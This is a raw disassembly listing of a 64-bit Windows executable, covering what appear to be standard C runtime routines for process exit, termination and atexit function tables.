   1400042d2:	83 38 00             	cmpl   $0x0,(%rax)
   1400042d5:	75 0e                	jne    0x1400042e5
   1400042d7:	c6 05 8a 3a 01 00 01 	movb   $0x1,0x13a8a(%rip)        # 0x140017d68
   1400042de:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400042e2:	c6 00 01             	movb   $0x1,(%rax)
   1400042e5:	48 83 c4 20          	add    $0x20,%rsp
   1400042e9:	5b                   	pop    %rbx
   1400042ea:	c3                   	ret
   1400042eb:	e8 30 09 00 00       	call   0x140004c20
   1400042f0:	90                   	nop
   1400042f1:	cc                   	int3
   1400042f2:	cc                   	int3
   1400042f3:	cc                   	int3
   1400042f4:	33 c0                	xor    %eax,%eax
   1400042f6:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   1400042fc:	0f 94 c0             	sete   %al
   1400042ff:	c3                   	ret
   140004300:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004305:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000430a:	89 54 24 10          	mov    %edx,0x10(%rsp)
   14000430e:	55                   	push   %rbp
   14000430f:	48 8b ec             	mov    %rsp,%rbp
   140004312:	48 83 ec 50          	sub    $0x50,%rsp
   140004316:	8b d9                	mov    %ecx,%ebx
   140004318:	45 85 c0             	test   %r8d,%r8d
   14000431b:	75 4a                	jne    0x140004367
   14000431d:	33 c9                	xor    %ecx,%ecx
   14000431f:	ff 15 5b 9d 00 00    	call   *0x9d5b(%rip)        # 0x14000e080
   140004325:	48 85 c0             	test   %rax,%rax
   140004328:	74 3d                	je     0x140004367
   14000432a:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000432f:	66 39 08             	cmp    %cx,(%rax)
   140004332:	75 33                	jne    0x140004367
   140004334:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140004338:	48 03 c8             	add    %rax,%rcx
   14000433b:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140004341:	75 24                	jne    0x140004367
   140004343:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140004348:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   14000434c:	75 19                	jne    0x140004367
   14000434e:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140004355:	76 10                	jbe    0x140004367
   140004357:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   14000435e:	74 07                	je     0x140004367
   140004360:	8b cb                	mov    %ebx,%ecx
   140004362:	e8 a1 00 00 00       	call   0x140004408
   140004367:	48 8d 45 18          	lea    0x18(%rbp),%rax
   14000436b:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   14000436f:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004373:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   140004377:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000437b:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000437f:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140004383:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140004387:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000438b:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   14000438f:	b8 02 00 00 00       	mov    $0x2,%eax
   140004394:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004398:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000439b:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000439e:	e8 55 fe ff ff       	call   0x1400041f8
   1400043a3:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   1400043a7:	74 0b                	je     0x1400043b4
   1400043a9:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400043ae:	48 83 c4 50          	add    $0x50,%rsp
   1400043b2:	5d                   	pop    %rbp
   1400043b3:	c3                   	ret
   1400043b4:	8b cb                	mov    %ebx,%ecx
   1400043b6:	e8 01 00 00 00       	call   0x1400043bc
   1400043bb:	cc                   	int3
   1400043bc:	40 53                	rex push %rbx
   1400043be:	48 83 ec 20          	sub    $0x20,%rsp
   1400043c2:	8b d9                	mov    %ecx,%ebx
   1400043c4:	e8 8b 32 00 00       	call   0x140007654
   1400043c9:	83 f8 01             	cmp    $0x1,%eax
   1400043cc:	74 28                	je     0x1400043f6
   1400043ce:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   1400043d5:	00 00 
   1400043d7:	8b 90 bc 00 00 00    	mov    0xbc(%rax),%edx
   1400043dd:	c1 ea 08             	shr    $0x8,%edx
   1400043e0:	f6 c2 01             	test   $0x1,%dl
   1400043e3:	75 11                	jne    0x1400043f6
   1400043e5:	ff 15 25 9d 00 00    	call   *0x9d25(%rip)        # 0x14000e110
   1400043eb:	48 8b c8             	mov    %rax,%rcx
   1400043ee:	8b d3                	mov    %ebx,%edx
   1400043f0:	ff 15 2a 9d 00 00    	call   *0x9d2a(%rip)        # 0x14000e120
   1400043f6:	8b cb                	mov    %ebx,%ecx
   1400043f8:	e8 0b 00 00 00       	call   0x140004408
   1400043fd:	8b cb                	mov    %ebx,%ecx
   1400043ff:	ff 15 13 9d 00 00    	call   *0x9d13(%rip)        # 0x14000e118
   140004405:	cc                   	int3
   140004406:	cc                   	int3
   140004407:	cc                   	int3
   140004408:	40 53                	rex push %rbx
   14000440a:	48 83 ec 20          	sub    $0x20,%rsp
   14000440e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140004414:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140004419:	8b d9                	mov    %ecx,%ebx
   14000441b:	48 8d 15 b6 ae 00 00 	lea    0xaeb6(%rip),%rdx        # 0x14000f2d8
   140004422:	33 c9                	xor    %ecx,%ecx
   140004424:	ff 15 fe 9c 00 00    	call   *0x9cfe(%rip)        # 0x14000e128
   14000442a:	85 c0                	test   %eax,%eax
   14000442c:	74 1f                	je     0x14000444d
   14000442e:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004433:	48 8d 15 b6 ae 00 00 	lea    0xaeb6(%rip),%rdx        # 0x14000f2f0
   14000443a:	ff 15 c8 9b 00 00    	call   *0x9bc8(%rip)        # 0x14000e008
   140004440:	48 85 c0             	test   %rax,%rax
   140004443:	74 08                	je     0x14000444d
   140004445:	8b cb                	mov    %ebx,%ecx
   140004447:	ff 15 eb 9d 00 00    	call   *0x9deb(%rip)        # 0x14000e238
   14000444d:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004452:	48 85 c9             	test   %rcx,%rcx
   140004455:	74 06                	je     0x14000445d
   140004457:	ff 15 8b 9c 00 00    	call   *0x9c8b(%rip)        # 0x14000e0e8
   14000445d:	48 83 c4 20          	add    $0x20,%rsp
   140004461:	5b                   	pop    %rbx
   140004462:	c3                   	ret
   140004463:	cc                   	int3
   140004464:	48 89 0d f5 38 01 00 	mov    %rcx,0x138f5(%rip)        # 0x140017d60
   14000446b:	c3                   	ret
   14000446c:	ba 02 00 00 00       	mov    $0x2,%edx
   140004471:	33 c9                	xor    %ecx,%ecx
   140004473:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   140004477:	e9 84 fe ff ff       	jmp    0x140004300
   14000447c:	33 d2                	xor    %edx,%edx
   14000447e:	33 c9                	xor    %ecx,%ecx
   140004480:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140004484:	e9 77 fe ff ff       	jmp    0x140004300
   140004489:	cc                   	int3
   14000448a:	cc                   	int3
   14000448b:	cc                   	int3
   14000448c:	45 33 c0             	xor    %r8d,%r8d
   14000448f:	41 8d 50 02          	lea    0x2(%r8),%edx
   140004493:	e9 68 fe ff ff       	jmp    0x140004300
   140004498:	48 83 ec 28          	sub    $0x28,%rsp
   14000449c:	4c 8b 05 85 2b 01 00 	mov    0x12b85(%rip),%r8        # 0x140017028
   1400044a3:	48 8b d1             	mov    %rcx,%rdx
   1400044a6:	41 8b c0             	mov    %r8d,%eax
   1400044a9:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400044ae:	83 e0 3f             	and    $0x3f,%eax
   1400044b1:	2b c8                	sub    %eax,%ecx
   1400044b3:	4c 39 05 a6 38 01 00 	cmp    %r8,0x138a6(%rip)        # 0x140017d60
   1400044ba:	75 12                	jne    0x1400044ce
   1400044bc:	48 d3 ca             	ror    %cl,%rdx
   1400044bf:	49 33 d0             	xor    %r8,%rdx
   1400044c2:	48 89 15 97 38 01 00 	mov    %rdx,0x13897(%rip)        # 0x140017d60
   1400044c9:	48 83 c4 28          	add    $0x28,%rsp
   1400044cd:	c3                   	ret
   1400044ce:	e8 4d 07 00 00       	call   0x140004c20
   1400044d3:	cc                   	int3
   1400044d4:	45 33 c0             	xor    %r8d,%r8d
   1400044d7:	33 d2                	xor    %edx,%edx
   1400044d9:	e9 22 fe ff ff       	jmp    0x140004300
   1400044de:	cc                   	int3
   1400044df:	cc                   	int3
   1400044e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400044e4:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   1400044ea:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   1400044ef:	75 12                	jne    0x140004503
   1400044f1:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   1400044f7:	74 0a                	je     0x140004503
   1400044f9:	87 0d 45 3b 01 00    	xchg   %ecx,0x13b45(%rip)        # 0x140018044
   1400044ff:	33 c0                	xor    %eax,%eax
   140004501:	eb 15                	jmp    0x140004518
   140004503:	e8 b8 12 00 00       	call   0x1400057c0
   140004508:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000450e:	e8 8d 11 00 00       	call   0x1400056a0
   140004513:	b8 16 00 00 00       	mov    $0x16,%eax
   140004518:	48 83 c4 28          	add    $0x28,%rsp
   14000451c:	c3                   	ret
   14000451d:	cc                   	int3
   14000451e:	cc                   	int3
   14000451f:	cc                   	int3
   140004520:	48 83 ec 28          	sub    $0x28,%rsp
   140004524:	ff 15 06 9c 00 00    	call   *0x9c06(%rip)        # 0x14000e130
   14000452a:	48 89 05 5f 38 01 00 	mov    %rax,0x1385f(%rip)        # 0x140017d90
   140004531:	ff 15 01 9c 00 00    	call   *0x9c01(%rip)        # 0x14000e138
   140004537:	48 89 05 5a 38 01 00 	mov    %rax,0x1385a(%rip)        # 0x140017d98
   14000453e:	b0 01                	mov    $0x1,%al
   140004540:	48 83 c4 28          	add    $0x28,%rsp
   140004544:	c3                   	ret
   140004545:	cc                   	int3
   140004546:	cc                   	int3
   140004547:	cc                   	int3
   140004548:	48 8d 05 29 38 01 00 	lea    0x13829(%rip),%rax        # 0x140017d78
   14000454f:	c3                   	ret
   140004550:	48 8d 05 29 38 01 00 	lea    0x13829(%rip),%rax        # 0x140017d80
   140004557:	c3                   	ret
   140004558:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000455d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004562:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004567:	57                   	push   %rdi
   140004568:	48 83 ec 30          	sub    $0x30,%rsp
   14000456c:	49 8b f9             	mov    %r9,%rdi
   14000456f:	8b 0a                	mov    (%rdx),%ecx
   140004571:	e8 6e 30 00 00       	call   0x1400075e4
   140004576:	90                   	nop
   140004577:	48 8d 1d da 3e 01 00 	lea    0x13eda(%rip),%rbx        # 0x140018458
   14000457e:	48 8d 35 1b 30 01 00 	lea    0x1301b(%rip),%rsi        # 0x1400175a0
   140004585:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000458a:	48 8d 05 cf 3e 01 00 	lea    0x13ecf(%rip),%rax        # 0x140018460
   140004591:	48 3b d8             	cmp    %rax,%rbx
   140004594:	74 19                	je     0x1400045af
   140004596:	48 39 33             	cmp    %rsi,(%rbx)
   140004599:	74 0e                	je     0x1400045a9
   14000459b:	48 8b d6             	mov    %rsi,%rdx
   14000459e:	48 8b cb             	mov    %rbx,%rcx
   1400045a1:	e8 3e 3f 00 00       	call   0x1400084e4
   1400045a6:	48 89 03             	mov    %rax,(%rbx)
   1400045a9:	48 83 c3 08          	add    $0x8,%rbx
   1400045ad:	eb d6                	jmp    0x140004585
   1400045af:	8b 0f                	mov    (%rdi),%ecx
   1400045b1:	e8 82 30 00 00       	call   0x140007638
   1400045b6:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400045bb:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400045c0:	48 83 c4 30          	add    $0x30,%rsp
   1400045c4:	5f                   	pop    %rdi
   1400045c5:	c3                   	ret
   1400045c6:	cc                   	int3
   1400045c7:	cc                   	int3
   1400045c8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400045cd:	87 05 cd 37 01 00    	xchg   %eax,0x137cd(%rip)        # 0x140017da0
   1400045d3:	c3                   	ret
   1400045d4:	4c 8b dc             	mov    %rsp,%r11
   1400045d7:	48 83 ec 28          	sub    $0x28,%rsp
   1400045db:	b8 04 00 00 00       	mov    $0x4,%eax
   1400045e0:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   1400045e4:	4d 8d 43 08          	lea    0x8(%r11),%r8
   1400045e8:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400045ec:	49 8d 53 18          	lea    0x18(%r11),%rdx
   1400045f0:	89 44 24 40          	mov    %eax,0x40(%rsp)
   1400045f4:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   1400045f8:	e8 5b ff ff ff       	call   0x140004558
   1400045fd:	48 83 c4 28          	add    $0x28,%rsp
   140004601:	c3                   	ret
   140004602:	cc                   	int3
   140004603:	cc                   	int3
   140004604:	40 53                	rex push %rbx
   140004606:	48 83 ec 20          	sub    $0x20,%rsp
   14000460a:	8b d9                	mov    %ecx,%ebx
   14000460c:	e8 d3 0b 00 00       	call   0x1400051e4
   140004611:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140004618:	41 8b d0             	mov    %r8d,%edx
   14000461b:	80 e2 02             	and    $0x2,%dl
   14000461e:	f6 da                	neg    %dl
   140004620:	1b c9                	sbb    %ecx,%ecx
   140004622:	83 fb ff             	cmp    $0xffffffff,%ebx
   140004625:	74 36                	je     0x14000465d
   140004627:	85 db                	test   %ebx,%ebx
   140004629:	74 39                	je     0x140004664
   14000462b:	83 fb 01             	cmp    $0x1,%ebx
   14000462e:	74 20                	je     0x140004650
   140004630:	83 fb 02             	cmp    $0x2,%ebx
   140004633:	74 15                	je     0x14000464a
   140004635:	e8 86 11 00 00       	call   0x1400057c0
   14000463a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004640:	e8 5b 10 00 00       	call   0x1400056a0
   140004645:	83 c8 ff             	or     $0xffffffff,%eax
   140004648:	eb 1d                	jmp    0x140004667
   14000464a:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   14000464e:	eb 04                	jmp    0x140004654
   140004650:	41 83 c8 02          	or     $0x2,%r8d
   140004654:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   14000465b:	eb 07                	jmp    0x140004664
   14000465d:	83 0d 4c 31 01 00 ff 	orl    $0xffffffff,0x1314c(%rip)        # 0x1400177b0
   140004664:	8d 41 02             	lea    0x2(%rcx),%eax
   140004667:	48 83 c4 20          	add    $0x20,%rsp
   14000466b:	5b                   	pop    %rbx
   14000466c:	c3                   	ret
   14000466d:	cc                   	int3
   14000466e:	cc                   	int3
   14000466f:	cc                   	int3
   140004670:	8b 05 2e 37 01 00    	mov    0x1372e(%rip),%eax        # 0x140017da4
   140004676:	c3                   	ret
   140004677:	cc                   	int3
   140004678:	48 83 ec 28          	sub    $0x28,%rsp
   14000467c:	83 f9 01             	cmp    $0x1,%ecx
   14000467f:	76 15                	jbe    0x140004696
   140004681:	e8 3a 11 00 00       	call   0x1400057c0
   140004686:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000468c:	e8 0f 10 00 00       	call   0x1400056a0
   140004691:	83 c8 ff             	or     $0xffffffff,%eax
   140004694:	eb 08                	jmp    0x14000469e
   140004696:	87 0d 08 37 01 00    	xchg   %ecx,0x13708(%rip)        # 0x140017da4
   14000469c:	8b c1                	mov    %ecx,%eax
   14000469e:	48 83 c4 28          	add    $0x28,%rsp
   1400046a2:	c3                   	ret
   1400046a3:	cc                   	int3
   1400046a4:	48 8d 05 fd 36 01 00 	lea    0x136fd(%rip),%rax        # 0x140017da8
   1400046ab:	c3                   	ret
   1400046ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400046b1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400046b6:	57                   	push   %rdi
   1400046b7:	48 83 ec 20          	sub    $0x20,%rsp
   1400046bb:	49 8b d9             	mov    %r9,%rbx
   1400046be:	49 8b f8             	mov    %r8,%rdi
   1400046c1:	8b 0a                	mov    (%rdx),%ecx
   1400046c3:	e8 1c 2f 00 00       	call   0x1400075e4
   1400046c8:	90                   	nop
   1400046c9:	48 8b cf             	mov    %rdi,%rcx
   1400046cc:	e8 53 00 00 00       	call   0x140004724
   1400046d1:	8b f8                	mov    %eax,%edi
   1400046d3:	8b 0b                	mov    (%rbx),%ecx
   1400046d5:	e8 5e 2f 00 00       	call   0x140007638
   1400046da:	8b c7                	mov    %edi,%eax
   1400046dc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046e1:	48 83 c4 20          	add    $0x20,%rsp
   1400046e5:	5f                   	pop    %rdi
   1400046e6:	c3                   	ret
   1400046e7:	cc                   	int3
   1400046e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400046ed:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400046f2:	57                   	push   %rdi
   1400046f3:	48 83 ec 20          	sub    $0x20,%rsp
   1400046f7:	49 8b d9             	mov    %r9,%rbx
   1400046fa:	49 8b f8             	mov    %r8,%rdi
   1400046fd:	8b 0a                	mov    (%rdx),%ecx
   1400046ff:	e8 e0 2e 00 00       	call   0x1400075e4
   140004704:	90                   	nop
   140004705:	48 8b cf             	mov    %rdi,%rcx
   140004708:	e8 c7 01 00 00       	call   0x1400048d4
   14000470d:	8b f8                	mov    %eax,%edi
   14000470f:	8b 0b                	mov    (%rbx),%ecx
   140004711:	e8 22 2f 00 00       	call   0x140007638
   140004716:	8b c7                	mov    %edi,%eax
   140004718:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000471d:	48 83 c4 20          	add    $0x20,%rsp
   140004721:	5f                   	pop    %rdi
   140004722:	c3                   	ret
   140004723:	cc                   	int3
   140004724:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004729:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000472e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004733:	57                   	push   %rdi
   140004734:	41 56                	push   %r14
   140004736:	41 57                	push   %r15
   140004738:	48 83 ec 20          	sub    $0x20,%rsp
   14000473c:	48 8b 01             	mov    (%rcx),%rax
   14000473f:	33 ed                	xor    %ebp,%ebp
   140004741:	4c 8b f9             	mov    %rcx,%r15
   140004744:	48 8b 18             	mov    (%rax),%rbx
   140004747:	48 85 db             	test   %rbx,%rbx
   14000474a:	0f 84 68 01 00 00    	je     0x1400048b8
   140004750:	4c 8b 15 d1 28 01 00 	mov    0x128d1(%rip),%r10        # 0x140017028
   140004757:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   14000475b:	49 8b f2             	mov    %r10,%rsi
   14000475e:	48 33 33             	xor    (%rbx),%rsi
   140004761:	4d 33 ca             	xor    %r10,%r9
   140004764:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140004768:	41 8b ca             	mov    %r10d,%ecx
   14000476b:	83 e1 3f             	and    $0x3f,%ecx
   14000476e:	49 33 da             	xor    %r10,%rbx
   140004771:	48 d3 cb             	ror    %cl,%rbx
   140004774:	48 d3 ce             	ror    %cl,%rsi
   140004777:	49 d3 c9             	ror    %cl,%r9
   14000477a:	4c 3b cb             	cmp    %rbx,%r9
   14000477d:	0f 85 a7 00 00 00    	jne    0x14000482a
   140004783:	48 2b de             	sub    %rsi,%rbx
   140004786:	b8 00 02 00 00       	mov    $0x200,%eax
   14000478b:	48 c1 fb 03          	sar    $0x3,%rbx
   14000478f:	48 3b d8             	cmp    %rax,%rbx
   140004792:	48 8b fb             	mov    %rbx,%rdi
   140004795:	48 0f 47 f8          	cmova  %rax,%rdi
   140004799:	8d 45 20             	lea    0x20(%rbp),%eax
   14000479c:	48 03 fb             	add    %rbx,%rdi
   14000479f:	48 0f 44 f8          	cmove  %rax,%rdi
   1400047a3:	48 3b fb             	cmp    %rbx,%rdi
   1400047a6:	72 1e                	jb     0x1400047c6
   1400047a8:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   1400047ac:	48 8b d7             	mov    %rdi,%rdx
   1400047af:	48 8b ce             	mov    %rsi,%rcx
   1400047b2:	e8 09 44 00 00       	call   0x140008bc0
   1400047b7:	33 c9                	xor    %ecx,%ecx
   1400047b9:	4c 8b f0             	mov    %rax,%r14
   1400047bc:	e8 97 10 00 00       	call   0x140005858
   1400047c1:	4d 85 f6             	test   %r14,%r14
   1400047c4:	75 28                	jne    0x1400047ee
   1400047c6:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   1400047ca:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400047d0:	48 8b d7             	mov    %rdi,%rdx
   1400047d3:	48 8b ce             	mov    %rsi,%rcx
   1400047d6:	e8 e5 43 00 00       	call   0x140008bc0
   1400047db:	33 c9                	xor    %ecx,%ecx
   1400047dd:	4c 8b f0             	mov    %rax,%r14
   1400047e0:	e8 73 10 00 00       	call   0x140005858
   1400047e5:	4d 85 f6             	test   %r14,%r14
   1400047e8:	0f 84 ca 00 00 00    	je     0x1400048b8
   1400047ee:	4c 8b 15 33 28 01 00 	mov    0x12833(%rip),%r10        # 0x140017028
   1400047f5:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   1400047f9:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   1400047fd:	49 8b f6             	mov    %r14,%rsi
   140004800:	48 8b cb             	mov    %rbx,%rcx
   140004803:	49 2b c9             	sub    %r9,%rcx
   140004806:	48 83 c1 07          	add    $0x7,%rcx
   14000480a:	48 c1 e9 03          	shr    $0x3,%rcx
   14000480e:	4c 3b cb             	cmp    %rbx,%r9
   140004811:	48 0f 47 cd          	cmova  %rbp,%rcx
   140004815:	48 85 c9             	test   %rcx,%rcx
   140004818:	74 10                	je     0x14000482a
   14000481a:	49 8b c2             	mov    %r10,%rax
   14000481d:	49 8b f9             	mov    %r9,%rdi
   140004820:	f3 48 ab             	rep stos %rax,(%rdi)
   140004823:	4c 8b 15 fe 27 01 00 	mov    0x127fe(%rip),%r10        # 0x140017028
   14000482a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004830:	49 8d 79 08          	lea    0x8(%r9),%rdi
   140004834:	41 8b c8             	mov    %r8d,%ecx
   140004837:	41 8b c2             	mov    %r10d,%eax
   14000483a:	83 e0 3f             	and    $0x3f,%eax
   14000483d:	2b c8                	sub    %eax,%ecx
   14000483f:	49 8b 47 08          	mov    0x8(%r15),%rax
   140004843:	48 8b 10             	mov    (%rax),%rdx
   140004846:	41 8b c0             	mov    %r8d,%eax
   140004849:	48 d3 ca             	ror    %cl,%rdx
   14000484c:	49 33 d2             	xor    %r10,%rdx
   14000484f:	49 89 11             	mov    %rdx,(%r9)
   140004852:	48 8b 15 cf 27 01 00 	mov    0x127cf(%rip),%rdx        # 0x140017028
   140004859:	8b ca                	mov    %edx,%ecx
   14000485b:	83 e1 3f             	and    $0x3f,%ecx
   14000485e:	2b c1                	sub    %ecx,%eax
   140004860:	8a c8                	mov    %al,%cl
   140004862:	49 8b 07             	mov    (%r15),%rax
   140004865:	48 d3 ce             	ror    %cl,%rsi
   140004868:	48 33 f2             	xor    %rdx,%rsi
   14000486b:	48 8b 08             	mov    (%rax),%rcx
   14000486e:	48 89 31             	mov    %rsi,(%rcx)
   140004871:	41 8b c8             	mov    %r8d,%ecx
   140004874:	48 8b 15 ad 27 01 00 	mov    0x127ad(%rip),%rdx        # 0x140017028
   14000487b:	8b c2                	mov    %edx,%eax
   14000487d:	83 e0 3f             	and    $0x3f,%eax
   140004880:	2b c8                	sub    %eax,%ecx
   140004882:	49 8b 07             	mov    (%r15),%rax
   140004885:	48 d3 cf             	ror    %cl,%rdi
   140004888:	48 33 fa             	xor    %rdx,%rdi
   14000488b:	48 8b 10             	mov    (%rax),%rdx
   14000488e:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   140004892:	48 8b 15 8f 27 01 00 	mov    0x1278f(%rip),%rdx        # 0x140017028
   140004899:	8b c2                	mov    %edx,%eax
   14000489b:	83 e0 3f             	and    $0x3f,%eax
   14000489e:	44 2b c0             	sub    %eax,%r8d
   1400048a1:	49 8b 07             	mov    (%r15),%rax
   1400048a4:	41 8a c8             	mov    %r8b,%cl
   1400048a7:	48 d3 cb             	ror    %cl,%rbx
   1400048aa:	48 33 da             	xor    %rdx,%rbx
   1400048ad:	48 8b 08             	mov    (%rax),%rcx
   1400048b0:	33 c0                	xor    %eax,%eax
   1400048b2:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1400048b6:	eb 03                	jmp    0x1400048bb
   1400048b8:	83 c8 ff             	or     $0xffffffff,%eax
   1400048bb:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400048c0:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1400048c5:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400048ca:	48 83 c4 20          	add    $0x20,%rsp
   1400048ce:	41 5f                	pop    %r15
   1400048d0:	41 5e                	pop    %r14
   1400048d2:	5f                   	pop    %rdi
   1400048d3:	c3                   	ret
   1400048d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048d9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400048de:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400048e3:	57                   	push   %rdi
   1400048e4:	41 56                	push   %r14
   1400048e6:	41 57                	push   %r15
   1400048e8:	48 83 ec 20          	sub    $0x20,%rsp
   1400048ec:	48 8b 01             	mov    (%rcx),%rax
   1400048ef:	48 8b f1             	mov    %rcx,%rsi
   1400048f2:	48 8b 18             	mov    (%rax),%rbx
   1400048f5:	48 85 db             	test   %rbx,%rbx
   1400048f8:	75 08                	jne    0x140004902
   1400048fa:	83 c8 ff             	or     $0xffffffff,%eax
   1400048fd:	e9 cf 00 00 00       	jmp    0x1400049d1
   140004902:	4c 8b 05 1f 27 01 00 	mov    0x1271f(%rip),%r8        # 0x140017028
   140004909:	41 8b c8             	mov    %r8d,%ecx
   14000490c:	49 8b f8             	mov    %r8,%rdi
   14000490f:	48 33 3b             	xor    (%rbx),%rdi
   140004912:	83 e1 3f             	and    $0x3f,%ecx
   140004915:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140004919:	48 d3 cf             	ror    %cl,%rdi
   14000491c:	49 33 d8             	xor    %r8,%rbx
   14000491f:	48 d3 cb             	ror    %cl,%rbx
   140004922:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140004926:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   14000492a:	0f 87 9f 00 00 00    	ja     0x1400049cf
   140004930:	41 8b c8             	mov    %r8d,%ecx
   140004933:	4d 8b f0             	mov    %r8,%r14
   140004936:	83 e1 3f             	and    $0x3f,%ecx
   140004939:	4c 8b ff             	mov    %rdi,%r15
   14000493c:	48 8b eb             	mov    %rbx,%rbp
   14000493f:	48 83 eb 08          	sub    $0x8,%rbx
   140004943:	48 3b df             	cmp    %rdi,%rbx
   140004946:	72 55                	jb     0x14000499d
   140004948:	48 8b 03             	mov    (%rbx),%rax
   14000494b:	49 3b c6             	cmp    %r14,%rax
   14000494e:	74 ef                	je     0x14000493f
   140004950:	49 33 c0             	xor    %r8,%rax
   140004953:	4c 89 33             	mov    %r14,(%rbx)
   140004956:	48 d3 c8             	ror    %cl,%rax
   140004959:	ff 15 d9 98 00 00    	call   *0x98d9(%rip)        # 0x14000e238
   14000495f:	4c 8b 05 c2 26 01 00 	mov    0x126c2(%rip),%r8        # 0x140017028
   140004966:	48 8b 06             	mov    (%rsi),%rax
   140004969:	41 8b c8             	mov    %r8d,%ecx
   14000496c:	83 e1 3f             	and    $0x3f,%ecx
   14000496f:	48 8b 10             	mov    (%rax),%rdx
   140004972:	4c 8b 0a             	mov    (%rdx),%r9
   140004975:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140004979:	4d 33 c8             	xor    %r8,%r9
   14000497c:	49 33 c0             	xor    %r8,%rax
   14000497f:	49 d3 c9             	ror    %cl,%r9
   140004982:	48 d3 c8             	ror    %cl,%rax
   140004985:	4d 3b cf             	cmp    %r15,%r9
   140004988:	75 05                	jne    0x14000498f
   14000498a:	48 3b c5             	cmp    %rbp,%rax
   14000498d:	74 b0                	je     0x14000493f
   14000498f:	4d 8b f9             	mov    %r9,%r15
   140004992:	49 8b f9             	mov    %r9,%rdi
   140004995:	48 8b e8             	mov    %rax,%rbp
   140004998:	48 8b d8             	mov    %rax,%rbx
   14000499b:	eb a2                	jmp    0x14000493f
   14000499d:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1400049a1:	74 0f                	je     0x1400049b2
   1400049a3:	48 8b cf             	mov    %rdi,%rcx
   1400049a6:	e8 ad 0e 00 00       	call   0x140005858
   1400049ab:	4c 8b 05 76 26 01 00 	mov    0x12676(%rip),%r8        # 0x140017028
   1400049b2:	48 8b 06             	mov    (%rsi),%rax
